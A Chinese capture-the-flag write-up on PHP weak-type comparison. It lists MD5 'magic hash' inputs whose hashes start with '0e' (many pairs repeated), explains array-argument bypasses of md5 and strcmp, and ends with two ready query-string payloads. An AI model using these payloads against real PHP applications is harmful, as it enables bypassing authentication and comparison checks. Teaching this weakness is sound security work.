## 前女友

**分类：**PHP弱类型

## write-up

此题的考点是PHP若类型，这儿考了一个等号的若类型比较的过程与strcmp函数的问题。

- 0e12345 == 0  0e 45678 == 0

由于在字符串比较的时候可以将其转换成数字比较。所以在md5的值进行比较的时候，可以使用产生0e开头且之后为数字的md5的值。

常用的有：

```
s878926199a
0e545993274517709034328855841020
s155964671a
0e342768416822451524974117254469
s214587387a
0e848240448830537924465865611904
s214587387a
0e848240448830537924465865611904
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s1885207154a
0e509367213418206700842008763514
s1502113478a
0e861580163291561247404381396064
s1885207154a
0e509367213418206700842008763514
s1836677006a
0e481036490867661113260034900752
s155964671a
0e342768416822451524974117254469
s1184209335a
0e072485820392773389523109082030
s1665632922a
0e731198061491163073197128363787
s1502113478a
0e861580163291561247404381396064
s1836677006a
0e481036490867661113260034900752
s1091221200a
0e940624217856561557816327384675
s155964671a
0e342768416822451524974117254469
s1502113478a
0e861580163291561247404381396064
s155964671a
0e342768416822451524974117254469
s1665632922a
0e731198061491163073197128363787
s155964671a
0e342768416822451524974117254469
s1091221200a
0e940624217856561557816327384675
s1836677006a
0e481036490867661113260034900752
s1885207154a
0e509367213418206700842008763514
s532378020a
0e220463095855511507588041205815
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s214587387a
0e848240448830537924465865611904
s1502113478a
0e861580163291561247404381396064
s1091221200a
0e940624217856561557816327384675
s1665632922a
0e731198061491163073197128363787
s1885207154a
0e509367213418206700842008763514
s1836677006a
0e481036490867661113260034900752
s1665632922a
0e731198061491163073197128363787
s878926199a
0e545993274517709034328855841020
```

奇数行为原来的字符串，偶数行为md5计算之后的值。

当然在这儿也可以利用数组的方式绕过，因为md5函数的参数为数组时返回值为`NULL`。

- strcmp — Warning

[官方strcmp](http://php.net/manual/zh/function.strcmp.php)

在strcmp的官方文档中存在一个如下警告：

```php
strcmp("foo", array()) => NULL + PHP Warning
```

当数组与字符串进行比较的时候返回值为`NULL`，由于非空即为真的原则，很容易绕过了strcmp函数。

`payload1：v1=s878926199a&v2=s155964671a&v3[]=1`

`payload2：v1[]=1&v2[]=2&v3[]=3`

